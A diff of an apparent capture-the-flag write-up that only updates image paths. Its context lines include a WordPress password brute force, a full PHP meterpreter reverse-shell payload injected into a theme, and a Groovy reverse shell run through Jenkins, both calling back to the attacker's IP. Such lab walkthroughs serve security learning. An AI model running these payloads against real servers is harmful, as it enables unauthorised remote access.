@@ -57,7 +57,7 @@ To confirm that there was nothing else running on hidden ports, I ran a broader 
 
 I then decided to move to the webserver and, after opening up the site index, found that I was given the default apache page for ubuntu.
 
-![webserver index page](/static/img/internal_http_index.png)
+![webserver index page](/images/internal_http_index.png)
 
 I assumed that there were more directories unlisted and decided to run `gobuster` with the `directory-list-2.3-medium.txt` wordlist to attempt to attempt to find anything else that could be sitting on the webserver.
 
@@ -92,7 +92,7 @@ I was lucky to find what looked like two potential paths forward, a blog running
 
 The wordpress blog appeared pretty bog-standard after opening the page, looking to be nothing more than a default install of wordpress.
 
-![wordpress index](/static/img/internal_http_blog_index.png)
+![wordpress index](/images/internal_http_blog_index.png)
 
 I browsed to a few common wordpress endpoints to confirm that it was that CMS and then chose to run `wpscan` against it to see if anything significant jumped out at me. Soon after, the scan identified that this was wordpress `5.4.2` but gave little else that was actionable for the attack.
 
@@ -158,7 +158,7 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2020-12-05 05:19:
 
 By the time I'd returned the bruteforce had yielded the password `my2boys` which I was able to confirm allowed me access to the admin panel.
 
-![wordpress admin panel](/static/img/internal_http_wp_admin.png)
+![wordpress admin panel](/images/internal_http_wp_admin.png)
 
 ### Popping a shell through wp admin
 
@@ -175,7 +175,7 @@ Payload size: 1114 bytes
 /*<?php /**/ error_reporting(0); $ip = '10.10.253.137'; $port = 4444; if (($f = 'stream_socket_client') && is_callable($f)) { $s = $f("tcp://{$ip}:{$port}"); $s_type = 'stream'; } if (!$s && ($f = 'fsockopen') && is_callable($f)) { $s = $f($ip, $port); $s_type = 'stream'; } if (!$s && ($f = 'socket_create') && is_callable($f)) { $s = $f(AF_INET, SOCK_STREAM, SOL_TCP); $res = @socket_connect($s, $ip, $port); if (!$res) { die(); } $s_type = 'socket'; } if (!$s_type) { die('no socket funcs'); } if (!$s) { die('no socket'); } switch ($s_type) { case 'stream': $len = fread($s, 4); break; case 'socket': $len = socket_read($s, 4); break; } if (!$len) { die(); } $a = unpack("Nlen", $len); $len = $a['len']; $b = ''; while (strlen($b) < $len) { switch ($s_type) { case 'stream': $b .= fread($s, $len-strlen($b)); break; case 'socket': $b .= socket_read($s, $len-strlen($b)); break; } } $GLOBALS['msgsock'] = $s; $GLOBALS['msgsock_type'] = $s_type; if (extension_loaded('suhosin') && ini_get('suhosin.executor.disable_eval')) { $suhosin_bypass=create_function('', $b); $suhosin_bypass(); } else { eval($b); } die();
 ```
 
-![wordpress template injection](/static/img/internal_http_wp_shell_injection.png)
+![wordpress template injection](/images/internal_http_wp_shell_injection.png)
 
 Prior to saving the theme, I prepped a listener in using the `exploit/multi/handler` module in metasploit to catch the new meterpreter session.
 
@@ -381,7 +381,7 @@ root@kali:~/ctf# ssh -L 8888:127.0.0.1:8080 -N -f aubreanna@10.10.215.86
 aubreanna@10.10.215.86's password:
 ```
 
-![jenkins login](/static/img/internal_http_jenkins_login.png)
+![jenkins login](/images/internal_http_jenkins_login.png)
 
 ### Enumerating the aubreanna user
 
@@ -451,7 +451,7 @@ Session completed
 
 I validated I was able to login with this new set of credentials and was pleased to access the jenkins admin panel.
 
-![jenkins admin](/static/img/internal_http_jenkins_admin.png)
+![jenkins admin](/images/internal_http_jenkins_admin.png)
 
 ### Popping a shell in jenkins
 
@@ -474,7 +474,7 @@ String cmd="cmd.exe";
 Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
 ```
 
-![groovy shell payload](/static/img/internal_http_jenkins_groovy_injection.png)
+![groovy shell payload](/images/internal_http_jenkins_groovy_injection.png)
 
 After executing the payload I caught the response on my new listener and migrated it using the `shell_to_meterpreter` module which gave me a second open meterpreter session on the host.
 
